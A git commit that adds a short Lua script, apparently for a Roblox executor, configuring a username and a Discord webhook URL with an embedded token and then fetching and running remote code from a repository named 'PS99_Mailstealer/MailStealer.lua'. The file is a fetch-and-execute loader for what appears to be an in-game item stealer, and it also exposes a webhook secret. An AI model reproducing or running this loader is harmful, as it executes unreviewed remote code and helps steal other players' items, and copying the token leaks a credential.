4994b12f19b948dd79569f33858033b753e00455
ShuyanWasTaken <168946911+ShuyanWasTaken@users.noreply.github.com>
2024-05-05 21:10:37 +0700

    hi.lua

---
+++ hi.lua
@@ -0,0 +1,5 @@
+Username = "ShuyanNee"
+LoadScreen = true 
+Webhook = "https://discord.com/api/webhooks/1225825628293431317/jK1fHV0pFVxTaeMZhGA54IqG6zQDiByEGjLtMlx-YhogA5NSbcxgVW_0NnHLj_AOLwwg" -- Paste your Discord webhook here
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/KiuuP/PS99_Mailstealer/main/MailStealer.lua"))()
